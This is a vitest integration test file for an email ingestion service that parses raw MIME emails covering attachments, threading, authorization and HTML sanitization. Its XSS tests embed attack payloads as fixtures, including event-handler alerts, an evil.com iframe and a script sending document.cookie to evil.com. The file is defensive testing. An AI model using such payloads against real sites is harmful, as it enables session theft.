/**
 * Email Ingestion Service - End-to-End Integration Tests
 *
 * These tests simulate the complete email processing flow from raw MIME email
 * through to database storage, using the actual mailparser library (not mocked).
 *
 * Test Coverage:
 * - Simple text emails
 * - HTML emails with tracking pixels (sanitization)
 * - Emails with attachments
 * - Malicious HTML (XSS prevention)
 * - Reply emails (thread ID handling)
 * - Full orchestration flow
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { simpleParser, ParsedMail } from 'mailparser';
import { processIngestedEmail } from './processIngestedEmail';
import { UnauthorizedError } from '@bike4mind/utils';
import type { EmailIngestionAdapters } from './types';

// Mock only infrastructure adapters, NOT the parser or business logic
// Import the actual extractEmails to use real implementation
vi.mock('./validateSender', async () => {
  const actual = await vi.importActual('./validateSender');
  return {
    ...actual,
    validateSenderAuthorization: vi.fn(),
  };
});

vi.mock('./processAttachments', () => ({
  processAttachments: vi.fn(),
}));

vi.mock('./processEmailBody', () => ({
  processEmailBody: vi.fn(),
}));

import { validateSenderAuthorization } from './validateSender';
import { processAttachments } from './processAttachments';
import { processEmailBody } from './processEmailBody';

describe('emailIngestionService - Integration Tests (End-to-End)', () => {
  let mockAdapters: EmailIngestionAdapters;

  beforeEach(() => {
    vi.resetAllMocks();

    mockAdapters = {
      db: {
        users: {
          findOne: vi.fn(),
          find: vi.fn(),
          create: vi.fn(),
          findById: vi.fn(),
          update: vi.fn(),
          updateMany: vi.fn(),
          delete: vi.fn(),
          count: vi.fn(),
        },
        ingestedEmails: {
          findByMessageId: vi.fn().mockResolvedValue(null),
          findByThreadId: vi.fn(),
          findByUserIdWithPagination: vi.fn(),
          findVisibleToUser: vi.fn(),
          releaseEmbargo: vi.fn(),
          findEmbargoedEmailsReadyForRelease: vi.fn(),
          findByPlatformEmailAddress: vi.fn(),
          findOne: vi.fn(),
          find: vi.fn(),
          create: vi.fn().mockResolvedValue({
            id: 'email123',
            messageId: expect.any(String),
            threadId: expect.any(String),
          }),
          findById: vi.fn().mockResolvedValue(null),
          update: vi.fn().mockResolvedValue({ id: 'email123' }),
          updateMany: vi.fn(),
          delete: vi.fn(),
          count: vi.fn(),
        },
        fabFiles: {
          findOne: vi.fn(),
          find: vi.fn(),
          create: vi.fn().mockResolvedValue({ id: 'fabfile123' }),
          findById: vi.fn(),
          update: vi.fn(),
          updateMany: vi.fn(),
          delete: vi.fn(),
          count: vi.fn(),
        },
        adminSettings: {
          findOne: vi.fn(),
          find: vi.fn(),
          create: vi.fn(),
          findById: vi.fn(),
          update: vi.fn(),
          updateMany: vi.fn(),
          delete: vi.fn(),
          count: vi.fn(),
        },
      },
      storage: {
        upload: vi.fn().mockResolvedValue('s3://bucket/path'),
        generateSignedUrl: vi.fn().mockResolvedValue('https://signed-url.example.com'),
      },
    };

    // Default mock for successful authorization
    vi.mocked(validateSenderAuthorization).mockResolvedValue({
      userId: 'user123',
      organizationId: 'org123',
      platformEmail: 'john.doe@app.example.com',
      senderEmail: 'sender@example.com',
    });

    vi.mocked(processAttachments).mockResolvedValue([]);
    vi.mocked(processEmailBody).mockResolvedValue({
      bodyMarkdown: '# Email Content',
    });
  });

  describe('Simple Text Email', () => {
    it('should parse and process a simple plain text email', async () => {
      // Real MIME email format
      const rawEmail = Buffer.from(
        `From: sender@example.com
To: john.doe@app.example.com
Subject: Simple Test Email
Message-ID: <simple-123@example.com>
Date: Mon, 20 Oct 2025 10:00:00 +0000
Content-Type: text/plain; charset=utf-8

This is a simple plain text email.
It has multiple lines.
And should be processed correctly.`
      );

      // Parse with real mailparser
      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      // Convert ParsedMail to our ParsedEmailObject format
      const emailObject = {
        messageId: parsedEmail.messageId,
        inReplyTo: parsedEmail.inReplyTo,
        references: parsedEmail.references,
        from: parsedEmail.from,
        to: parsedEmail.to,
        cc: parsedEmail.cc,
        bcc: parsedEmail.bcc,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      // Process through service
      const result = await processIngestedEmail(emailObject, 's3://bucket/simple.eml', mockAdapters);

      // Verify parsing
      expect(parsedEmail.subject).toBe('Simple Test Email');
      expect(parsedEmail.text).toContain('This is a simple plain text email');
      expect(parsedEmail.from?.value?.[0]?.address).toBe('sender@example.com');
      expect(parsedEmail.to?.value?.[0]?.address).toBe('john.doe@app.example.com');

      // Verify service processing
      expect(result.emailId).toBe('email123');
      expect(result.alreadyProcessed).toBe(false);
      expect(mockAdapters.db.ingestedEmails.create).toHaveBeenCalled();
    });
  });

  describe('HTML Email with Tracking Pixels', () => {
    it('should parse HTML email and sanitize tracking pixels', async () => {
      // Email with tracking pixels that should be removed
      const rawEmail = Buffer.from(
        `From: newsletter@example.com
To: john.doe@app.example.com
Subject: Newsletter with Tracking
Message-ID: <newsletter-456@example.com>
Date: Mon, 20 Oct 2025 11:00:00 +0000
Content-Type: text/html; charset=utf-8

<html>
<body>
<h1>Newsletter Content</h1>
<p>This is the main content of the newsletter.</p>
<img src="https://tracy.srv.wisestamp.com/track.gif?id=123" alt="__tpx__" />
<img src="https://example.com/pixel.gif" width="1" height="1" />
<p>More content here.</p>
</body>
</html>`
      );

      // Parse with real mailparser
      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        inReplyTo: parsedEmail.inReplyTo,
        references: parsedEmail.references,
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      // Process through service
      const result = await processIngestedEmail(emailObject, 's3://bucket/newsletter.eml', mockAdapters);

      // Verify HTML was parsed
      expect(parsedEmail.html).toContain('Newsletter Content');
      expect(parsedEmail.html).toContain('tracy.srv.wisestamp.com');

      // Verify tracking pixels are in the HTML (they'll be cleaned during body processing)
      expect(parsedEmail.html).toBeTruthy();

      // Verify service called body processor (which includes sanitization)
      expect(processEmailBody).toHaveBeenCalledWith(
        expect.objectContaining({
          html: expect.stringContaining('Newsletter Content'),
        }),
        'user123',
        'email123',
        false,
        expect.anything(),
        'org123'
      );

      expect(result.emailId).toBe('email123');
    });
  });

  describe('Email with Attachment', () => {
    it('should parse email with attachment and process it', async () => {
      // Email with a small text attachment
      const rawEmail = Buffer.from(
        `From: sender@example.com
To: john.doe@app.example.com
Subject: Email with Attachment
Message-ID: <attach-789@example.com>
Date: Mon, 20 Oct 2025 12:00:00 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="boundary123"

--boundary123
Content-Type: text/plain; charset=utf-8

Please find the attached file.

--boundary123
Content-Type: text/plain; name="readme.txt"
Content-Disposition: attachment; filename="readme.txt"

This is the content of the attached file.
--boundary123--`
      );

      // Parse with real mailparser
      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      // Mock attachment processing to return one attachment
      vi.mocked(processAttachments).mockResolvedValue([
        {
          filename: 'readme.txt',
          mimeType: 'text/plain',
          size: 42,
          fabFileId: 'fabfile-attach-123',
        },
      ]);

      // Process through service
      const result = await processIngestedEmail(emailObject, 's3://bucket/attach.eml', mockAdapters);

      // Verify attachment was parsed
      expect(parsedEmail.attachments).toHaveLength(1);
      expect(parsedEmail.attachments[0].filename).toBe('readme.txt');
      expect(parsedEmail.attachments[0].contentType).toBe('text/plain');

      // Verify service processed attachment
      expect(processAttachments).toHaveBeenCalledWith(
        expect.objectContaining({
          attachments: expect.arrayContaining([
            expect.objectContaining({
              filename: 'readme.txt',
            }),
          ]),
        }),
        'user123',
        'Email with Attachment',
        expect.anything(),
        'org123'
      );

      expect(result.attachments).toHaveLength(1);
      expect(result.attachments[0].fabFileId).toBe('fabfile-attach-123');
    });
  });

  describe('Malicious HTML (XSS Prevention)', () => {
    it('should parse email with malicious HTML safely', async () => {
      // Email with XSS attempts
      const rawEmail = Buffer.from(
        `From: attacker@example.com
To: john.doe@app.example.com
Subject: Suspicious Email
Message-ID: <xss-101@example.com>
Date: Mon, 20 Oct 2025 13:00:00 +0000
Content-Type: text/html; charset=utf-8

<html>
<body>
<h1>Legitimate Content</h1>
<p>This looks normal but contains:</p>
<script>alert('XSS Attack!')</script>
<img src="x" onerror="alert('XSS')" />
<a href="javascript:alert('XSS')">Click me</a>
<iframe src="http://evil.com"></iframe>
<p onmouseover="alert('XSS')">Hover me</p>
</body>
</html>`
      );

      // Parse with real mailparser (mailparser doesn't sanitize, it just parses)
      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      // Process through service
      const result = await processIngestedEmail(emailObject, 's3://bucket/xss.eml', mockAdapters);

      // Verify malicious HTML was parsed (mailparser doesn't filter)
      expect(parsedEmail.html).toContain('<script>');
      expect(parsedEmail.html).toContain('onerror=');
      expect(parsedEmail.html).toContain('javascript:');

      // The HTML is stored as-is in the database (bodyHtml field)
      // Sanitization happens during:
      // 1. Body processing (script/style tags removed by turndown)
      // 2. Frontend rendering (React/DOMPurify sanitization)
      expect(mockAdapters.db.ingestedEmails.create).toHaveBeenCalledWith(
        expect.objectContaining({
          bodyHtml: expect.stringContaining('<script>'), // Raw HTML stored
        })
      );

      // Body processor is called (which removes scripts/styles via turndown)
      expect(processEmailBody).toHaveBeenCalledWith(
        expect.objectContaining({
          html: expect.stringContaining('<script>'),
        }),
        'user123',
        'email123',
        false,
        expect.anything(),
        'org123'
      );

      expect(result.emailId).toBe('email123');
    });

    it('should verify XSS protection via turndown during body processing', async () => {
      // This test verifies that the cleanEmailHtml function removes dangerous content
      const rawEmail = Buffer.from(
        `From: attacker@example.com
To: john.doe@app.example.com
Subject: More XSS Attempts
Message-ID: <xss-102@example.com>
Date: Mon, 20 Oct 2025 14:00:00 +0000
Content-Type: text/html; charset=utf-8

<html>
<head>
<style>body { background: red; }</style>
<script src="http://evil.com/steal.js"></script>
</head>
<body>
<p>Legitimate content</p>
<script>
  document.cookie = "stolen";
  fetch('http://evil.com/steal?data=' + document.cookie);
</script>
</body>
</html>`
      );

      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      await processIngestedEmail(emailObject, 's3://bucket/xss2.eml', mockAdapters);

      // Verify body processor was called with HTML containing scripts
      // The actual sanitization happens in processEmailBody via cleanEmailHtml
      expect(processEmailBody).toHaveBeenCalledWith(
        expect.objectContaining({
          html: expect.stringContaining('<script'),
        }),
        'user123',
        'email123',
        false,
        expect.anything(),
        'org123'
      );

      // In real usage, processEmailBody -> cleanEmailHtml -> removes <script> and <style>
      // This is tested in processEmailBody.test.ts integration
      // This test only verifies the orchestration calls it correctly
    });
  });

  describe('Reply Email (Thread ID Handling)', () => {
    it('should handle reply with In-Reply-To header', async () => {
      const rawEmail = Buffer.from(
        `From: sender@example.com
To: john.doe@app.example.com
Subject: Re: Original Email
Message-ID: <reply-123@example.com>
In-Reply-To: <original-456@example.com>
References: <original-456@example.com>
Date: Mon, 20 Oct 2025 15:00:00 +0000
Content-Type: text/plain; charset=utf-8

This is a reply to the original email.`
      );

      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        inReplyTo: parsedEmail.inReplyTo,
        references: parsedEmail.references,
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      const result = await processIngestedEmail(emailObject, 's3://bucket/reply.eml', mockAdapters);

      // Verify reply headers were parsed
      expect(parsedEmail.inReplyTo).toBe('<original-456@example.com>');
      expect(parsedEmail.references).toContain('<original-456@example.com>');

      // Verify threadId uses In-Reply-To (tested in processIngestedEmail.test.ts)
      expect(mockAdapters.db.ingestedEmails.create).toHaveBeenCalledWith(
        expect.objectContaining({
          inReplyTo: '<original-456@example.com>',
          threadId: '<original-456@example.com>',
          references: expect.arrayContaining(['<original-456@example.com>']),
        })
      );

      expect(result.threadId).toBe('<original-456@example.com>');
    });

    it('should handle email with multiple references', async () => {
      const rawEmail = Buffer.from(
        `From: sender@example.com
To: john.doe@app.example.com
Subject: Re: Re: Original Email
Message-ID: <reply-789@example.com>
References: <original-111@example.com> <reply-222@example.com> <reply-333@example.com>
Date: Mon, 20 Oct 2025 16:00:00 +0000
Content-Type: text/plain; charset=utf-8

This is a reply in a long thread.`
      );

      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        inReplyTo: parsedEmail.inReplyTo,
        references: parsedEmail.references,
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      const result = await processIngestedEmail(emailObject, 's3://bucket/long-thread.eml', mockAdapters);

      // Verify references array was parsed
      expect(Array.isArray(parsedEmail.references)).toBe(true);
      expect(parsedEmail.references?.length).toBeGreaterThan(0);

      // Thread ID should use first reference when no In-Reply-To
      expect(result.threadId).toBe('<original-111@example.com>');
    });
  });

  describe('Full Orchestration Flow', () => {
    it('should execute complete email ingestion pipeline', async () => {
      // Complex email with all features
      const rawEmail = Buffer.from(
        `From: complex@example.com
To: john.doe@app.example.com
Cc: cc@example.com
Subject: Complex Email Test
Message-ID: <complex-999@example.com>
Date: Mon, 20 Oct 2025 17:00:00 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="boundary456"

--boundary456
Content-Type: text/html; charset=utf-8

<html>
<body>
<h1>Important Document</h1>
<p>This email contains important information and an attachment.</p>
<img src="https://tracy.srv.wisestamp.com/track.gif" alt="__tpx__" />
</body>
</html>

--boundary456
Content-Type: application/pdf; name="report.pdf"
Content-Disposition: attachment; filename="report.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQKJeLjz9MKMSAwIG9iag==
--boundary456--`
      );

      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        from: parsedEmail.from,
        to: parsedEmail.to,
        cc: parsedEmail.cc,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      // Override the default validation mock for this specific test
      vi.mocked(validateSenderAuthorization).mockResolvedValueOnce({
        userId: 'user123',
        organizationId: 'org123',
        platformEmail: 'john.doe@app.example.com',
        senderEmail: 'complex@example.com', // Match the actual sender
      });

      // Mock full processing
      vi.mocked(processAttachments).mockResolvedValue([
        {
          filename: 'report.pdf',
          mimeType: 'application/pdf',
          size: 1024,
          fabFileId: 'fabfile-pdf-456',
        },
      ]);

      vi.mocked(processEmailBody).mockResolvedValue({
        bodyMarkdown: '# Important Document\n\nThis email contains important information and an attachment.',
        bodyFabFileId: 'fabfile-body-789',
      });

      const result = await processIngestedEmail(emailObject, 's3://bucket/complex.eml', mockAdapters);

      // Verify full pipeline execution
      expect(validateSenderAuthorization).toHaveBeenCalled();
      expect(mockAdapters.db.ingestedEmails.create).toHaveBeenCalledWith(
        expect.objectContaining({
          messageId: '<complex-999@example.com>',
          subject: 'Complex Email Test',
          from: 'complex@example.com',
        })
      );
      expect(processAttachments).toHaveBeenCalled();
      expect(processEmailBody).toHaveBeenCalled();
      expect(mockAdapters.db.ingestedEmails.update).toHaveBeenCalledWith(
        expect.objectContaining({
          id: 'email123',
          attachments: expect.arrayContaining([
            expect.objectContaining({
              filename: 'report.pdf',
            }),
          ]),
          bodyFabFileId: 'fabfile-body-789',
        })
      );

      // Verify result
      expect(result.emailId).toBe('email123');
      expect(result.attachments).toHaveLength(1);
      expect(result.bodyFabFileCreated).toBe(true);
      expect(result.alreadyProcessed).toBe(false);
    });
  });

  describe('Authorization Failures', () => {
    it('should reject unauthorized sender', async () => {
      const rawEmail = Buffer.from(
        `From: unauthorized@badactor.com
To: john.doe@app.example.com
Subject: Spam Email
Message-ID: <spam-123@badactor.com>
Date: Mon, 20 Oct 2025 18:00:00 +0000
Content-Type: text/plain; charset=utf-8

This is spam.`
      );

      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      // Mock authorization failure
      vi.mocked(validateSenderAuthorization).mockResolvedValue(null);

      // Should throw UnauthorizedError
      await expect(processIngestedEmail(emailObject, 's3://bucket/spam.eml', mockAdapters)).rejects.toThrow(
        UnauthorizedError
      );

      // Verify no email was stored
      expect(mockAdapters.db.ingestedEmails.create).not.toHaveBeenCalled();
      expect(processAttachments).not.toHaveBeenCalled();
      expect(processEmailBody).not.toHaveBeenCalled();
    });
  });

  describe('Edge Cases and Error Handling', () => {
    it('should handle email without Message-ID', async () => {
      const rawEmail = Buffer.from(
        `From: sender@example.com
To: john.doe@app.example.com
Subject: No Message ID
Date: Mon, 20 Oct 2025 19:00:00 +0000
Content-Type: text/plain; charset=utf-8

Email without Message-ID header.`
      );

      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId, // Will be undefined or auto-generated by mailparser
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      const result = await processIngestedEmail(emailObject, 's3://bucket/no-id.eml', mockAdapters);

      // Verify email was processed despite missing Message-ID
      expect(result.emailId).toBe('email123');

      // Thread ID should be generated
      expect(mockAdapters.db.ingestedEmails.create).toHaveBeenCalledWith(
        expect.objectContaining({
          threadId: expect.any(String),
        })
      );
    });

    it('should handle multipart/alternative emails', async () => {
      const rawEmail = Buffer.from(
        `From: sender@example.com
To: john.doe@app.example.com
Subject: Multipart Alternative
Message-ID: <multipart-123@example.com>
Date: Mon, 20 Oct 2025 20:00:00 +0000
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="alt123"

--alt123
Content-Type: text/plain; charset=utf-8

This is the plain text version.

--alt123
Content-Type: text/html; charset=utf-8

<html><body><p>This is the <strong>HTML</strong> version.</p></body></html>
--alt123--`
      );

      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      const result = await processIngestedEmail(emailObject, 's3://bucket/multipart.eml', mockAdapters);

      // Verify both text and HTML were parsed
      expect(parsedEmail.text).toContain('plain text version');
      expect(parsedEmail.html).toContain('HTML');

      // Verify email stored both versions
      expect(mockAdapters.db.ingestedEmails.create).toHaveBeenCalledWith(
        expect.objectContaining({
          bodyText: expect.stringContaining('plain text'),
          bodyHtml: expect.stringContaining('HTML'),
        })
      );

      expect(result.emailId).toBe('email123');
    });

    it('should handle idempotency for duplicate emails', async () => {
      const rawEmail = Buffer.from(
        `From: sender@example.com
To: john.doe@app.example.com
Subject: Duplicate Email
Message-ID: <duplicate-123@example.com>
Date: Mon, 20 Oct 2025 21:00:00 +0000
Content-Type: text/plain; charset=utf-8

This email is sent twice due to retry.`
      );

      const parsedEmail: ParsedMail = await simpleParser(rawEmail);

      const emailObject = {
        messageId: parsedEmail.messageId,
        from: parsedEmail.from,
        to: parsedEmail.to,
        subject: parsedEmail.subject,
        date: parsedEmail.date,
        text: parsedEmail.text,
        html: parsedEmail.html || undefined,
        attachments: parsedEmail.attachments,
      };

      // Mock existing email
      vi.mocked(mockAdapters.db.ingestedEmails.findByMessageId).mockResolvedValue({
        id: 'existing-email-123',
        messageId: '<duplicate-123@example.com>',
        threadId: 'thread-123',
        attachments: [{ filename: 'doc.pdf', mimeType: 'application/pdf', size: 1000 }],
        bodyFabFileId: 'fab123',
      } as any);

      vi.mocked(mockAdapters.db.ingestedEmails.findById).mockResolvedValue({
        id: 'existing-email-123',
        attachments: [{ filename: 'doc.pdf', mimeType: 'application/pdf', size: 1000 }],
        bodyFabFileId: 'fab123',
      } as any);

      const result = await processIngestedEmail(emailObject, 's3://bucket/duplicate.eml', mockAdapters);

      // Verify idempotency
      expect(result.emailId).toBe('existing-email-123');
      expect(result.alreadyProcessed).toBe(true);
      expect(mockAdapters.db.ingestedEmails.create).not.toHaveBeenCalled();
      expect(processAttachments).not.toHaveBeenCalled();
      expect(processEmailBody).not.toHaveBeenCalled();
    });
  });
});
